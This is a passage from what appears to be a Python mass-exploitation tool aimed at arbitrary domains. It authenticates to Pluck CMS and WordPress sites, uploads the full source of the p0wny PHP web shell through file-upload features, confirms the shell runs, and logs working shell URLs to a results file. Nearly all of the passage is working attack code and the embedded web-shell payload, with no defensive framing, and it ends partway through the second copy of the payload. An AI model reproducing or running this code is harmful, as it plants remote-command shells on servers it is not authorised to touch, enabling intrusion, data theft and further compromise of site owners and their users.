        cookies_session = session.cookies.get_dict()
        cookie = json.dumps(cookies_session)
        cookie = cookie.replace('"}','')
        cookie = cookie.replace('{"', '')
        cookie = cookie.replace('"', '')
        cookie = cookie.replace(" ", '')
        cookie = cookie.replace(":", '=')

        base_content_len = 27
        password_encoded = urllib.parse.quote(password, safe='')
        password_encoded_len = len(password_encoded.encode('utf-8'))
        content_len = base_content_len + password_encoded_len

        # Construct Header:
        header = {
            'Host': target_ip,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': str(content_len),
            'Origin': 'http://' + target_ip,
            'Connection': 'close',
            'Referer': 'http://' + target_ip + pluckcmspath + '/login.php',
            'Cookie': cookie,
            'Upgrade-Insecure-Requests': '1'
        }

        # Construct Data:
        body = {
            'cont1': password,
            'bogus': '',
            'submit': 'Log in',
        }

        # Authenticating:
        link_auth = 'http://' + target_ip + ':' + target_port + pluckcmspath + '/login.php'
        auth = requests.post(link_auth, headers=header, data=body, timeout=20, verify=False)
        # Construct Header:
        header = {
            'Host': target_ip,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'multipart/form-data; boundary=---------------------------5170699732428994785525662060',
            'Connection': 'close',
            'Referer': 'http://' + target_ip + ':' + target_port + pluckcmspath + '/admin.php?action=files',
            'Cookie': cookie,
            'Upgrade-Insecure-Requests': '1'
        }

        # Constructing Webshell payload: I'm using p0wny-shell: https://github.com/flozz/p0wny-shell
        data = "-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"filefile\"; filename=\"shell.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n-----------------------------5170699732428994785525662060--\r\n"

        # Uploading Webshell:
        link_upload = 'http://' + target_ip + ':' + target_port + pluckcmspath + '/admin.php?action=files'
        upload = requests.post(link_upload, headers=header, data=data, verify=False, timeout=20)
        shell = 'http://' + target_ip + ':' + target_port + pluckcmspath + '/files/shell.phar'
        check = requests.get(shell, headers=ua, timeout=10, verify=False).text
        if "<title>p0wny@shell:~#" in check:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #5 -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shell}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #5 -->> {red}Failed Exploit !")

    except:pass


def WpEx6(domain):
    try:
        target_ip = domain
        target_port = "80"
        wp_path = "/wordpress/"
        username = "AXVTECH666"
        password = "AXVTECH666PASS@#"

        session = requests.Session()
        auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

        # Header:
        header = {
            'Host': target_ip,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://' + target_ip,
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }

        # Body:
        body = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        # Authenticate:
        auth = session.post(auth_url, headers=header, data=body, timeout=20, verify=False)
        auth_header = auth.headers['Set-Cookie']

        exploit_url = "http://" + target_ip + ':' + target_port + wp_path + "wp-admin/admin.php?page=MEC-ix&tab=MEC-import"

        # Exploit Header:
        header = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "multipart/form-data; boundary=---------------------------29650037893637916779865254589",
            "Origin": "http://" + target_ip,
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
        }

        # Exploit Body: (using p0wny shell: https://github.com/flozz/p0wny-shell
        body = "-----------------------------29650037893637916779865254589\r\nContent-Disposition: form-data; name=\"feed\"; filename=\"shell.php\"\r\nContent-Type: text/csv\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  